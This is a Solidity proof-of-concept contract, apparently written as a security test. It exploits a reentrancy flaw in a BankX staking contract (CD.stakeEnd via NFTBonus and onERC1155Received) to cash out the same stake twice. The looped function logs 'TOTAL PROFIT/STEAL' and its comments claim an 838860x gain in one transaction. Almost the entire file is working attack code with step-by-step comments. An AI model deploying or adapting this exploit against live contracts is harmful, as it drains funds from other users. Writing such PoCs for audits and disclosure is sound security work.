// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {BankXNFT} from "./BankXNFT.sol";
import {NFTBonus} from "./NFTBonus.sol";
import {CD} from "./CD.sol";
import "hardhat/console.sol";

contract BankXReentrancy {

    IERC20 public BANKX;
    NFTBonus public nftbonus;
    BankXNFT public banknft;
    CD public cd;

    bool reentrancy = false;

    uint256 stakeid;

    uint256 tokenid;

    uint256 totalprofit = 0;

    bool recordlogs = true;

    //This test case exploits a reentrancy condition in stakeEnd in contract CD.

    //Assume the attacker creates a stake with a higher amount and one with a lower
    //amount.

    //The attacker calls stakeEnd in CD with the higher amount stakeid.
    //CD calls stakeEnd in the NFTBonus contract which in turn calls
    //unstakeNFT internally - this transfers the NFT back to the staker (contract)
    //and calls onERC1155Received. Now, onERC1155Received calls stakeEnd in CD
    //again using the same stakeid (which passes because _stakeRemove has not yet been
    // invoked). CD again calls stakeEnd in NFTBonus, and it
    //simply returns because nftsStakedToCDLength == 0. Now, _stakeRemove is
    //called twice and the attacker is paid 2x the amount of the same stakeid.

    //modified to stakein and stakeout instantly
    //in the hardcoded case, a smart contract can loop through
    //20 times with a starting balance of 1000000000000000000
    //and walk away with 838860000000000000000000 ie (838860x) in one transaction

    function testExploitYesInstant() public {
        uint256 times = 20;
        uint256 startingbalance = BANKX.balanceOf(address(this));

        for (uint256 x = 0; x < times; x++) {
            testReentrancyInstant(true);
        }

        uint256 endingbalance = BANKX.balanceOf(address(this));
        totalprofit = endingbalance - startingbalance;

        console.log("startingbalance", startingbalance);
        console.log("endingbalance", endingbalance);
        console.log("\n\nDONE. TOTAL PROFIT/STEAL", totalprofit);
        console.log("\nDONE. TOTAL PROFIT/STEAL TIMES", endingbalance / startingbalance);
    }

    function buynftonceandstake() public {
        banknft.setApprovalForAll(address(nftbonus), true);

        BANKX.approve(address(cd), 2 ** 256 - 1);
    }

    function setTokenId(uint256 token) external {
        tokenid = token;
    }

    function setStakeId(uint256 stake) external {
        stakeid = stake;
    }

    function testReentrancyInstant(bool exploitit) internal {
        //stake it
        nftbonus.stakeNFT(tokenid);

        //reentrancy to true so our logic in onERC1155Received kicks in
        if (exploitit) {
            reentrancy = true;
            console.log("\n\nREENTRANCY ON");
        } else {
            console.log("\n\nREENTRANCY OFF");
        }

        uint256 startingbalance = BANKX.balanceOf(address(this));
        uint256 tostake = (startingbalance - 100000000000000000) / 10000000000;

        if (recordlogs) {
//            vm.recordLogs();
        }

        cd.stakeStart(tostake, 365);

        if (recordlogs) {
//            Vm.Log[] memory entries = vm.getRecordedLogs();
//            (, stakeid,) = abi.decode(entries[1].data, (uint256, uint256, uint256));
            recordlogs = false;
        } else {
            stakeid += 2;
        }

        //stake another 0.1 of it and we dont need to record the stakeid
        //because we will cash out the 0.9 one twice

        cd.stakeStart(10000000, 365);

        //no warp, cashing out instantly

        //call stakeEnd
        console.log("calling stakeendreentrancy is", reentrancy);
        cd.stakeEnd(0, uint40(stakeid));

        if (!exploitit) {
            cd.stakeEnd(0, uint40(stakeid + 1));
        }

        uint256 endingbalance = BANKX.balanceOf(address(this));

        console.log("We put in %d of BANKX and cashed out %d of BANKX instantly", startingbalance, endingbalance);
    }


    receive() external payable {
        //console.log("receive");
    }

    fallback() external payable {
        //console.log("fallback");
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) external returns (bytes4) {
        if (reentrancy) {
            reentrancy = false;

            cd.stakeEnd(0, uint40(stakeid));
        }

        return this.onERC1155Received.selector;
    }

    function updateBankXContract(address _bankXContract) external {
        BANKX = IERC20(_bankXContract);
    }

    function updateNFTBonusContract(address _nftBonusContract) external {
        nftbonus = NFTBonus(_nftBonusContract);
    }

    function updateNFTContract(address _nftContract) external {
        banknft = BankXNFT(_nftContract);
    }

    function updateCDContract(address _cdContract) external {
        cd = CD(_cdContract);
    }
}